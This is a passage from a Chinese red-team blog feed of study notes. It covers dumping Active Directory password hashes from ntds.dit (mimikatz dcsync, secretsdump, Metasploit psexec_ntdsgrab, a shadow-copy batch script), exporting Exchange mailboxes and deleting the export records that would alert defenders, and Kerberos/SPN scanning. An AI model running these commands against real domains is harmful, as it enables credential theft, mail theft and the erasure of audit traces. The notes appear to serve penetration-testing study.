class="line-numbers-rows"><span></span></span></code></pre><p>或者直接使用 python 执行 secretsdump.py 文件</p><pre class="line-numbers language-none"><code class="language-none">cd .&#x2F;build&#x2F;scripts-3.9python3 secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作，下载地址：<a href="https://github.com/zcgonvh/NTDSDumpEx/releases">https://github.com/zcgonvh/NTDSDumpEx/releases</a></p><pre class="line-numbers language-none"><code class="language-none">NTDSDumpEx -d ntds.dit -s system -o domain.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz 有个 dcsync 的功能，可以利用卷影拷贝服务直接读取 ntds.dit 文件，不过需要管理员权限。</p><p>导出域内所有用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;all &#x2F;csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>导出域内指定用户的用户名和哈希值</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:administrator<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过转储 lsass.exe 进行 dump 操作</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;inject<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>如果输出内容太多，可以使用 log 命令，这样操作就都会被记录到文本里了</p></blockquote><h3 id="Invoke-DCSync-ps1"><a href="#Invoke-DCSync-ps1" class="headerlink" title="Invoke-DCSync.ps1"></a>Invoke-DCSync.ps1</h3><p>该脚本通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 dcsync 功能，并利用 dcsync 直接读取 ntds.dit 得到域用户密码散列值</p><p>Invoke-DCSync.ps1 下载地址：<a href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 </p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrabset rhosts 192.168.7.7set smbdomain teamssix.comset smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdumpset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p></blockquote><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>DSInternals 下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p><p>安装 DSInternals</p><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接导出 hash，并保存在 output_hash.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h3><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre class="line-numbers language-none"><code class="language-none">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.ditset DESTINATION_PATH&#x3D;%~dp0@echo ...Determine the scripts to be executed&#x2F;generated...set CALLBACK_SCRIPT&#x3D;%~dpnx0set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del &#x2F;f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p><p>使用 esentutl 修复导出的 ntds.dit 文件</p><pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p><pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 log 里就能看到导出的密码哈希了</p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a></p><p><a href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p><p><a href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a></p><p><a href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;在活动目录中，所有数据都保存在 ntds.dit 文件中，ntds.dit 是一个二进制文件，存储位置为域控的 %Syste</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】25、Exchange 邮件服务器</title>
    <link href="https://www.teamssix.com/210908-105249.html"/>
    <id>https://www.teamssix.com/210908-105249.html</id>
    <published>2021-09-08T02:52:49.000Z</published>
    <updated>2021-09-08T03:04:59.541Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Exchange-的基本操作"><a href="#1、Exchange-的基本操作" class="headerlink" title="1、Exchange 的基本操作"></a>1、Exchange 的基本操作</h2><blockquote><p>在 Exchange 服务器上的 PowerShell 里进行以下操作</p></blockquote><p>将 Exchange 管理单元添加到当前会话中</p><pre class="line-numbers language-none"><code class="language-none">add-pssnapin microsoft.exchange*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看邮件数据库</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -server &quot;dc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询数据库的物理路径</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxDatabase -Identity &#39;Mailbox Database 0761701514&#39; | Format-List Name,EdbFilePath,LogFolderPath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取现有用户的邮件地址</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox | Format-table Name,WindowsEmailAddress<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看指定用户的邮箱使用信息</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailboxstatistics -Identity Administrator | Select Dispayname,ItemCount,TotalItemSize,TotalTimeSize,LastLogonTime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取用户邮箱中的邮件数量，通过该命令还可以列出那些用户未登录过邮箱</p><pre class="line-numbers language-none"><code class="language-none">Get-Mailbox -ResultSize Unlimited | Get-Mailboxstatistics | Sort-Object TotalItemSize -Descend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、导出指定的电子邮箱"><a href="#2、导出指定的电子邮箱" class="headerlink" title="2、导出指定的电子邮箱"></a>2、导出指定的电子邮箱</h2><p>Exchange Server 2007 中需要使用 ExportMailBox 命令，在 Exchange Server 2010 SP1 及以后的版本中可以使用图形化界面导出，也可以使用 PowerShell</p><p>如果想要导出 PTS 格式的邮件文件，则需要为用户配置导出/导出权限。</p><h3 id="配置用户的导入导出权限"><a href="#配置用户的导入导出权限" class="headerlink" title="配置用户的导入导出权限"></a>配置用户的导入导出权限</h3><p>查看用户权限</p><pre class="line-numbers language-none"><code class="language-none">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 Administrator 用户添加到 Mailbox Import Export  角色组里，将用户添加到角色组后，需要重启 Exchange 服务才能执行导出操作</p><pre class="line-numbers language-none"><code class="language-none">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除刚刚添加的 Mailbox Import Export 角色组中的用户</p><pre class="line-numbers language-none"><code class="language-none">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h3><p>不论使用哪种方式导出邮件，都需要将文件放置在 UNC（Universal Naming Convention，通用命名规则，也称通用命名规范）路径下</p><p>类似于 “\hostname\sharename”、“\ipaddress\sharename” 的网络路径下，sharename 为网络共享名称。</p><p>首先开启共享，将 C 盘 inetpub 文件夹设置为 everyone 可读写，执行如下命令：</p><pre class="line-numbers language-none"><code class="language-none">net share inetpub&#x3D;c:\inetpub &#x2F;grant:everyone,full<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h3><p>使用 PowerShell 导出电子邮件，用户的电子邮箱目录一般为Inbox（收件箱）、SentItems（已发送邮件）、DeleteItems（已删除邮件）、Drafts（草稿）等</p><pre class="line-numbers language-none"><code class="language-none">New-MailboxExportRequest -Mailbox administrator -FilePath \\192.168.7.77\inetpub\administrator.pst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用图形化界面导出电子邮件，访问 <a href="https://127.0.0.1/ecp%EF%BC%8C%E6%89%93%E5%BC%80">https://127.0.0.1/ecp，打开</a> Exchange 管理中心的登录界面。</p><p>输入账号密码进入 Exchange 管理中心，点击「…」更多按钮，选择「导出到 PST 文件」即可进行导出操作。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908104558.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h3><p>不论是通过 Powershell 导出还是通过图形化的方式导出，都会在 Exchange 中生成一条告警信息，这些信息有助于 BT 发现服务器里的异常行为，通过以下命令，可以查看之前的导出请求记录信息。</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将指定用户已经完成的导出请求删除</p><pre class="line-numbers language-none"><code class="language-none">Remove-MailboxExportRequest -Identity Administrator\MailboxExport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有已完成的导出请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除所有导出请求，包括完成和失败的请求</p><pre class="line-numbers language-none"><code class="language-none">Get-MailboxExportRequest | Remove-MailboxExportRequest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://www.cnblogs.com/micr067/p/12307519.html">https://www.cnblogs.com/micr067/p/12307519.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、Exchange-的基本操作&quot;&gt;&lt;a href=&quot;#1、Exchange-的基本操作&quot; class=&quot;headerlink&quot; title=&quot;1、Exchange 的基本操作&quot;&gt;&lt;/a&gt;1、Exchange 的基本操作&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】24、SPN 的应用</title>
    <link href="https://www.teamssix.com/210907-121204.html"/>
    <id>https://www.teamssix.com/210907-121204.html</id>
    <published>2021-09-07T04:12:04.000Z</published>
    <updated>2021-09-23T06:02:35.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><h3 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h3><p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p><p>在域环境中运行的大量应用包含了多种资源，为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主题名称即 SPN (Service Principal Name）</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos 是由 MIT 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p><p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p><p>Kerberos 协议中的名称解释：</p><ul><li>Client: 访问服务的客户端</li><li>Server: 提供服务的服务器</li><li>KDC (Key Distribution Center): 密钥分发中心</li><li>AS (Authentication Service): 认证服务器</li><li>TGS (Ticket Granting Service): 票据授予服务</li><li>DC (Domain Controller): 域控制器</li><li>AD (Account Database): 用户数据库</li><li>TGT (Ticket Granting Ticket): 票证授予票证</li><li>ST (Servre Ticket): 服务票据</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906154732.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>根据上图，这里一步一步进行解释</p><p><strong>第一阶段：Clinet 与 AS</strong></p><p>① 客户端向认证服务器 AS 发起请求，请求内容为自己的用户名、主机 IP 和当前时间戳。</p><p>② AS 接收到请求，此时 AS 会根据用户名在用户数据库 AD 中寻找，判断这个用户名在不在白名单里，此时只会查找具有相同用户名的用户，并不会判断身份的可靠性；如果没有该用户名，认证失败；如果存在该用户名，则 AS 便认为用户存在，此时 AS 对客户端做出响应，响应内容包含两部分：</p><ul><li>第一部分：票据授予票据 TGT，客户端需要使用 TGT 去密钥分发中心 KDC 中的票据授予服务 TGS 获取访问网络服务所需的票据，TGT 中包含的内容有 kerberos 数据库中存在的客户端信息、IP、当前时间戳 </li><li>第二部分：使用客户端密钥加密的一段内容，这段内容包括：用于客户端和 TGS 之间通信的 Session_Key (CT_SK) ，客户端即将访问的 TGS 信息以及 TGT 的有效时间和一个当前时间戳，该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。</li></ul><p>至此，第一阶段通信完成。</p><p><strong>第二阶段：Clinet 与 TGS</strong></p><p>此时客户端已经获取到了 AS 返回的消息，客户端会将 AS 返回的第二部分内容进行解密，分别获得时间戳、接下来要访问的 TGS 信息以及用于和 TGS 通信的密钥 CT_SK</p><p>首先客户端会判断时间戳与自己发出的时间差是否大于 5 分钟，如果大于 5 分钟那就认为这个 AS 是伪造的，认证失败，否则就继续准备向 TGS 发起请求。</p><p>③ 客户端向 TGS 发起请求，请求的内容包含三部分：</p><ul><li>第一部分：使用 CT_SK 加密的客户端信息、IP、时间戳</li><li>第二部分：自己想要访问的 Server 服务信息（明文形式）</li><li>第三部分：使用 TGS 密钥加密的 TGT</li></ul><p>④ TGS 接收到请求，首先判断当前系统是否存在客户端想要访问的 Server 服务，如果不存在，认证失败，如果存在则继续接下来的认证。</p><p>​    接下来 TGS 利用自己的秘钥解密 TGT 内容，此时 TGS 获取到经过 AS 认证后的用户信息、CT_SK、时间戳信息，通过时间戳判断此次请求时延是否正常，如果时延正常就继续下一步。</p><p>​    之后 TGS 会使用 CT_SK 解密客户端发来的第一部分内容，取出其中的用户信息和 TGT 里的用户信息进行对比，如果全部一致则认为客户端身份正常，继续下一步。</p><p>​    此时 TGS 将向客户端发起响应，响应信息包含两部分：</p><ul><li>第一部分：使用服务端密码加密的服务票据 ST，其中包括客户端信息、IP、客户端待访问的服务端信息、ST 有效信息、时间戳以及用于客户端和服务端之间通信的 CS_SK</li><li>第二部分：使用 CT_SK 加密的内容，其中包括 CS_SK 、时间戳和 ST 的有效时间。</li></ul><p>至此，第二阶段通信完成。</p><p><strong>第三阶段：Clinet 与 Server</strong></p><p>此时客户端收到来自 TGS 的响应，并使用本地缓存的 CT_SK 解密出 TGS 返回的第二部分内容，检查时间戳无误后，取出 CS_SK 准备向服务端发起请求。这里由于 TGS 返回的第一部分信息是用的服务端秘钥加密的，因此这里的客户端是无法进行解密的。</p><p>⑤ 客户端向服务端发送请求，请求内容包括两部分：</p><ul><li>第一部分：利用 CS_SK 将自己的主机信息和时间戳进行加密的信息</li><li>第二部分：第 ④ 步里 TGS 向客户端返回的第一部分内容，即使用服务端密码加密的服务票据 ST</li></ul><p>⑥ 服务端此时收到了来自客户端的请求，它会使用自己的密钥解密客户端发来的第二部分内容，核对时间戳之后，取出 CS_SK，利用 CS_SK 解密第一部分内容，从而获得经过 TGS 认证后的客户端信息。</p><p>此时服务端会将第一部分解密后的信息与第二部分解密后的信息进行对比，如果一致则说明该客户端身份为真实身份，此时服务端向客户端响应使用 CS_SK 加密的表示接受的信息，客户端接受到信息后也确认了服务端的真实性。</p><p>至此，第三阶段通信完成，到这里整个 kerberos 认证也就完成了，接下来客户端与服务端就能放心的进行通信了。</p><p>这里可以再通过时序图加深下印象。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210906174237.jpg?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>注意点：</p><ul><li>KDC 服务默认会安装在一个域的域控中</li><li>Kerberos 认证采用对称加密算法</li><li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li><li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li><li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li></ul><h2 id="1、SPN"><a href="#1、SPN" class="headerlink" title="1、SPN"></a>1、SPN</h2><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p><p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p><p>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RT 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上。</p><p>SPN 格式如下：</p><pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>serviceclass（必选）：服务组件名称</p><p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (全限定域名，同时带有计算机名和域名)</p><p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p><p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</p></blockquote><h3 id="常见-SPN-服务"><a href="#常见-SPN-服务" class="headerlink" title="常见 SPN 服务"></a>常见 SPN 服务</h3><p>MSSQL 服务</p><pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;DBServer.teamssix.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exchange 服务</p><pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>RDP 服务</p><pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>WSMan/WinRM/PSRemoting 服务</p><pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="SPN-扫描脚本"><a href="#SPN-扫描脚本" class="headerlink" title="SPN 扫描脚本"></a>SPN 扫描脚本</h3><p>SPN 扫描也叫「扫描 Kerberos 服务实例名称」，在活动目录中发现服务的最佳方法就是 SPN 扫描。</p><p>SPN 扫描通过请求特定 SPN 类型的服务主体名称来查找服务，与网络端口相比，SPN 扫描的主要特点是不需要通过连接网络中的每个 IP 地址来检查服务端口，因此不会因触发内网中的安全设备规则而产生大量的告警日志。</p><p>由于 SPN 查询是 Kerberos 票据行为的一部分，所以检测难度较大。</p><h4 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h4><p>setspn 是 Windows 自带命令，以下命令可列出域中所有的 SPN 信息</p><pre class="line-numbers language-none"><code class="language-none">setspn -T teamssix -Q *&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Active-Directory-模块"><a href="#Active-Directory-模块" class="headerlink" title="Active Directory 模块"></a>Active Directory 模块</h4><p>PowerShell 模块 Active Directory 只在域控上有</p><pre class="line-numbers language-none"><code class="language-none">Import-Module ActiveDirectoryget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者使用大佬导出的模块，这样普通用户也可以使用该模块，下载地址：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Microsoft.ActiveDirectory.Management.dllget-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h4><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,last<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Powershell-AD-Recon"><a href="#Powershell-AD-Recon" class="headerlink" title="Powershell-AD-Recon"></a>Powershell-AD-Recon</h4><p>Powershell-AD-Recon 提供了一系列获取服务与服务登录账号和运行服务的主机之间的对应关系的工具，这些服务包括但不限于 MSSQL、Exchange、RDP、WinRM</p><p>Powershell-AD-Recon 下载地址：<a href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p><p>Powershell-AD-Recon 工具包里的内容如下：</p><pre class="line-numbers language-none"><code class="language-none">Discover-PSInterestingServices# 查找所有 SPN 服务Discover-PSMSExchangeServers# 查找 Exchange 服务器Discover-PSMSSQLServers         # 查找 MSSQL 服务器Find-PSServiceAccounts          # 查找服务账户Get-DomainKerberosPolicy        # 获取域 Kerberos 策略Get-PSADForestInfo              # 获取域森林信息Get-PSADForestqInfo             # 获取域森林 KRBTGT 信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>下载后的文件是没有 .ps1 后缀的，需要自己添加上</p></blockquote><p>由于 SPN 是通过 LDAP 协议向域控制器进行查询的，因此 RT 需要获得一个普通的域用户权限才可以进行 SPN 扫描。</p><p>将 PowerShell 脚本导入并执行，以 MSSQL 服务为例</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Discover-PSMSSQLServers.ps1Discover-PSMSSQLServers或者PowerShell -Exec bypass -C 